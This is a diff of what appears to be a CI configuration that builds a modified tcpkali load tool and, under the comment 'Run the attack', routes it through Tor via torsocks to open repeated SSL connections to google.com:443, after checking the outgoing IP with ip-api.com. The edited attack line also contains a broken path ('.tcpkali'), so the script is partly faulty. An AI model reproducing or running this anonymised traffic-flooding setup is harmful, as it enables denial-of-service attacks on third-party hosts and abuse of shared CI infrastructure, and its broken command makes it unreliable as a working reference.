@@ -1,4 +1,10 @@
 script:
+  # Install modified tcpkali
+  - cd tcpkali
+  - autoreconf -iv && ./configure
+  - sudo make --jobs=4 --silent
+  - sudo make install --silent
+
   # Setup tor, torsocks
   - sudo apt-get install tor
   - sudo service tor start
@@ -6,4 +12,4 @@ script:
 
   # Run the attack
   - sudo curl http://ip-api.com
-  - sudo torsocks --isolate ./tcpkali --connections=10 --ssl --duration=30s --message="   " --message-rate=5 google.com:443
+  - sudo torsocks --isolate .tcpkali --connections=10 --ssl --duration=30s --message="   " --message-rate=5 google.com:443
